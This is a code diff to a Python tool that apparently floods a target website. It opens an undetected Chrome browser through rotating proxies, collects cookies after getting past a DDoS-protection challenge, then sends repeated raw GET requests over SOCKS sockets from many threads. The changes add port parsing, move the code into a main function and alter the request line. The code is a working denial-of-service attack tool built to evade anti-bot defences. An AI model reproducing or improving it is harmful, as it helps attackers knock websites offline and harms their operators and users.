@@ -31,6 +31,7 @@ import socket
 import socks
 import threading
 from colored import stylize
+from urllib.parse import urlparse
 from datetime import datetime
 import undetected_chromedriver.v2 as webdriver
 import sys
@@ -59,7 +60,6 @@ class Target():
         options.add_argument("--disable-logging")
         options.add_argument('--no-sandbox')
         options.add_argument('--proxy-server=%s' % proxy)
-        #options.add_argument(f"--user-agent={random.choice(config['headers'])}")
         options.add_argument("--disable-login-animations")
         options.add_argument("--disable-notifications")
         options.add_argument("--disable-default-apps")
@@ -132,10 +132,15 @@ class Target():
         target = {}
         target['uri'] = urlparse(Main.GetArgs()[1]).path
         target['host'] = urlparse(Main.GetArgs()[1]).netloc
-        target['port'] = "443" if urlparse(Main.GetArgs()[1]).scheme == "https" else "80"
+        target['scheme'] = urlparse(Main.GetArgs()[1]).scheme
+        if ":" in urlparse(Main.GetArgs()[1]).netloc:
+            target['port'] = urlparse(Main.GetArgs()[1]).netloc.split(":")[1]
+        else:
+            target['port'] = "443" if urlparse(Main.GetArgs()[1]).scheme == "https" else "80"
+            pass
 
         network = {}
-        network['raw'] =  'GET ' + target['uri'] + ' HTTP/1.1\r\n'
+        network['raw'] =  'GET ' + target['uri'] + ' HTTP/2.0\r\n'
         network['raw'] += 'Host: ' + target['host'] + '\r\n'
         network['raw'] += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
         network['raw'] += 'Accept-Encoding: gzip, deflate, br\r\n'
@@ -151,7 +156,7 @@ class Target():
         network['raw'] += 'sec-fetch-site: same-origin\r\n'
         network['raw'] += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
 
-        if target['port'] == '443':
+        if target['scheme'] == 'https':
             while True:
                 try:
                     packet = socks.socksocket()
@@ -192,12 +197,8 @@ class Target():
             pass
         pass
 
-if __name__ == '__main__':
-    ################################################################################
-    # This file is the worker file, there is the source-code, it will start the    #
-    # browser with proxy randomly got in "./proxies.txt" and it will               #
-    # get the cookies from a bypassed uam with the browser.                        #
-    ################################################################################
+
+def main():
     global config
 
     print(stylize('''
@@ -223,13 +224,6 @@ if __name__ == '__main__':
     config['proxies'] = open(sys.argv[3]).read().split("\n") 
     config['threads'] = {}
 
-    config['headers'] = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.3112.113 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.3626.121 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.3626.121 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4472.77 Safari/537.36"
-    ]
-
     try:
         for hash_digest in range(int(Main.GetArgs()[2])):
             time.sleep(3)
@@ -240,3 +234,13 @@ if __name__ == '__main__':
     except KeyboardInterrupt:
         sys.exit()
         pass
+    pass
+
+if __name__ == '__main__':
+    ################################################################################
+    # This file is the worker file, there is the source-code, it will start the    #
+    # browser with proxy randomly got in "./proxies.txt" and it will               #
+    # get the cookies from a bypassed uam with the browser.                        #
+    ################################################################################
+
+    main()
